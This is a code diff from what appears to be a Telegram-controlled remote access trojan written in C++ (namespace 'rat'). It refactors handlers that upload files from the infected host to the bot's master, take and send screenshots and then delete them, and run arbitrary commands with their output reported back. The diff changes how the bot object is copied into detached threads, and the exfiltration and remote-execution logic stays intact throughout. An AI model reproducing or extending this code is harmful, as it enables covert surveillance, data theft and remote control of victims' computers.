@@ -14,6 +14,8 @@
 
 namespace rat::handler {
 constexpr size_t MAX_TELEGRAM_UPLOAD_SIZE = 50 * 1024 * KB; 
+
+constexpr uint8_t TIMEMOUT_FOR_FILEOPS = 255;
 // Command handler implementations
 /*This method cannot run asynchronously for big files because the upload will be interrupted from the https requests that are sent from the parent thread */
 void Handler::handleGetCommand() {
@@ -34,20 +36,19 @@ void Handler::handleGetCommand() {
         this->bot.sendFile(file_path);
     }else if (file_size < MAX_TELEGRAM_UPLOAD_SIZE) { // Defined in this file with constexpr
         // Medium file: send asynchronously 
-        constexpr auto timeout_with_telegram_server = 255;
-        auto copy_bot = std::make_shared<tbot::Bot>(bot.getToken(), bot.getMasterId(), timeout_with_telegram_server);
-        std::thread([copy_bot, file_path]() {
+        auto unique_copy_backing_bot = std::make_unique<tbot::BaseBot>(backing_bot.getToken(), backing_bot.getMasterId(), TIMEMOUT_FOR_FILEOPS);
+        std::thread([moved_bot = std::move(unique_copy_backing_bot), file_path]() {
             try {
                 DEBUG_LOG("Launching a thread to upload the file {}", file_path.string());
-                copy_bot->sendFile("Uploading the file asynchronously");
-                auto resp = copy_bot->sendFile(file_path);
+                moved_bot->sendFile("Uploading the file asynchronously");
+                auto resp = moved_bot->sendFile(file_path);
                 if (resp != rat::tbot::BotResponse::SUCCESS) {
                     ERROR_LOG("Failed to upload {}", file_path.string());
                 }
             } catch (const std::exception& ex) {
                 const std::string message = fmt::format("Exception in async upload thread: {}", ex.what());
                 ERROR_LOG(message);
-                copy_bot->sendMessage(message);
+                moved_bot->sendMessage(message);
             } catch (...) {
                 ERROR_LOG("Unknown exception in async upload thread");
             }
@@ -62,28 +63,24 @@ void Handler::handleScreenshotCommand() {
         fmt::format("{}.jpg", rat::system::getCurrentDateTime_Underscored())
     );
 
-    auto bot_shared = std::make_shared<tbot::Bot>(bot.getToken(), bot.getMasterId());
+    auto unique_copy_backing_bot = std::make_unique<tbot::BaseBot>(backing_bot.getToken(), backing_bot.getMasterId(), TIMEMOUT_FOR_FILEOPS);
     // Launch screenshot asynchronously
-    std::thread([bot_shared, image_path]() {
+    std::thread([moved_bot = std::move(unique_copy_backing_bot), image_path]() {
         std::string output_buffer;
         bool success = rat::media::screenshot::takeScreenshot(image_path, output_buffer);
 
         if(success && std::filesystem::exists(image_path)) {
             DEBUG_LOG("{} taken", image_path.string());
 
-            if(bot_shared->sendPhoto(image_path) != rat::tbot::BotResponse::SUCCESS) {
+            if(moved_bot->sendPhoto(image_path) != rat::tbot::BotResponse::SUCCESS) {
                 ERROR_LOG("Failed at uploading {}", image_path.string());
             }
-
             rat::system::removeFile(image_path);
         }
-
         if (!output_buffer.empty()) {
-            bot_shared->sendMessage(output_buffer);
+            moved_bot->sendMessage(output_buffer);
         }
     }).detach();
-
-    // Immediate confirmation (optional)
     bot.sendMessage(fmt::format("Screenshot command launched."));
 }
 
@@ -130,9 +127,9 @@ void Handler::parseAndHandleProcessCommand() {
     }
     auto fut = rat::system::runProcessAsync(message_text, timeout);
     this->bot.sendMessage(fmt::format("Process '{}' launched successfully.", message_text));
-    auto bot_shared = std::make_shared<tbot::Bot>(this->bot.getToken(), this->bot.getMasterId());
 
-    std::thread([bot_shared , fut = std::move(fut), cmd = message_text]() mutable {
+     auto unique_copy_backing_bot = std::make_unique<tbot::BaseBot>(backing_bot.getToken(), backing_bot.getMasterId(), TIMEMOUT_FOR_FILEOPS);
+    std::thread([moved_bot = std::move(unique_copy_backing_bot), fut = std::move(fut), cmd = message_text]() mutable {
         try {
             DEBUG_LOG("thread has being created + bot object copied {}", sizeof(tbot::Bot));
             auto res = fut.get(); // wait for process to finish
@@ -161,12 +158,12 @@ void Handler::parseAndHandleProcessCommand() {
                 }
             }
             DEBUG_LOG("[{}:{} {}] {}", __FILE__, __LINE__, __func__, feedback);
-            bot_shared->sendMessage(feedback);
+            moved_bot->sendMessage(feedback);
 
         } catch (const std::exception& ex) {
             std::string err = fmt::format("Exception waiting for process {}", ex.what());
             ERROR_LOG(err);
-            bot_shared->sendMessage(err);
+            moved_bot->sendMessage(err);
         }
     }).detach();
 
